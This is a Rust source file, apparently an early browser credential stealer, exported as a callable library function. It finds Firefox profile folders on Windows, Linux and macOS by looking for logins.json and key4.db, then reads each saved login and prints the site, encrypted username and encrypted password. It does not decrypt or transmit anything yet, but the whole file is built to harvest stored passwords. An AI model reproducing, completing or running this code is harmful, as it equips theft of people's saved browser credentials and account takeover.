use std::fs;

#[no_mangle]
pub fn run(os: i32) {
    let os = match os {
        0 => OS::Windows,
        1 => OS::Linux,
        2 => OS::MacOS,
        _ => panic!("Invalid OS"),
    };


    println!("Getting Firefox profiles");
    let profiles = firefox_find_profiles(os, "/home/mark");
    for profile in profiles {
        println!("Profile: {}", profile);
        firefox_extract_logins(&profile);
    }
}

enum OS {
    Windows,
    Linux,
    MacOS,
}

fn firefox_find_profiles(os: OS, home_dir: &str) -> Vec<String> {

    let mut profiles: Vec<String> = Vec::new();
    let os_path = match os {
        OS::Windows => "AppData/Roaming/Mozilla/Firefox/Profiles",
        OS::Linux => ".mozilla/firefox",
        OS::MacOS => "Library/Application Support/Firefox/Profiles",
    };

    // first find all login.json and key4.db files
    for entry in fs::read_dir(format!("{}/{}", home_dir, os_path)).expect("ERR 010").filter_map(Result::ok){
        if let Ok(filetype) = entry.file_type() {
            if filetype.is_dir() {
                let files_in_profile = fs::read_dir(entry.path()).expect("ERR 011").filter_map(Result::ok).map(|entry| entry.file_name()).collect::<Vec<_>>();

                if files_in_profile.iter().any(|file| file == "logins.json") 
                && files_in_profile.iter().any(|file| file == "key4.db") {

                    profiles.push(entry.path().to_str().expect("ERR 013").to_owned());
                }
            }

        }
    }
    profiles
}

fn firefox_extract_logins(profile: &str) {
    let logins = fs::read(format!("{}/logins.json", profile)).expect("ERR 012");
    let parsed = serde_json::from_slice::<serde_json::Value>(&logins).expect("ERR 014");
    let logins = parsed["logins"].as_array().expect("ERR 015");
    for login in logins {
        println!("------------------");
        println!("URL: {}", login["hostname"].as_str().expect("ERR 016"));
        println!("Username: {}", login["encryptedUsername"].as_str().expect("ERR 017"));
        println!("Password: {}", login["encryptedPassword"].as_str().expect("ERR 018"));
        println!("------------------\n");
    }

}